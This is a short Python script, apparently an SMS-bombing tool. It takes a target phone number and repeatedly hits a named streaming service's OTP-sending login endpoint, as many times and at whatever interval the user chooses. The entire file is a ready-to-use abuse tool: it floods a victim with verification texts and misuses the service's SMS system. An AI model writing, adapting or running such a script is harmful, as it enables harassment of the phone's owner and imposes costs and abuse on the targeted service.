import requests
import time


num = str(input("ENTER  THE NUMBER: "))

api = api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+num+"&operator=bd-otp"



def send(amount,n):
	try:
		for x in range(amount):
			m = requests.get(api,time.sleep(n),timeout=10)
			if m.status_code == 200:
				print("Success")

			else:
				print("failed")	

			
	except Exception:
		print("cant send SMS")		

	
	
if __name__ == '__main__':
	send(int(input("amount: ")),int(input("time: ")))



